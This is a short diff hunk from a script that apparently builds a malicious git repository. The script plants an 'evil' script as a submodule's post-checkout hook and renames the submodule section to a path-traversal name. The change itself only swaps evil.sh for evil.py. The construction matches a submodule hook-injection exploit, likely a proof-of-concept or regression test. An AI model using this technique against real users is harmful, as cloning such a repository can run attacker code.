@@ -18,7 +18,7 @@ cp -r .git/modules/evil modules/1/2/3/4
 cd modules
 ln -s 1/2/3/4/evil evil
 cd ..
-cp ../evil.sh modules/evil/hooks/post-checkout
+cp ../evil.py modules/evil/hooks/post-checkout
 git config -f .gitmodules submodule.evil.update checkout
 git config -f .gitmodules --rename-section submodule.evil submodule.../../modules/evil
 git add modules
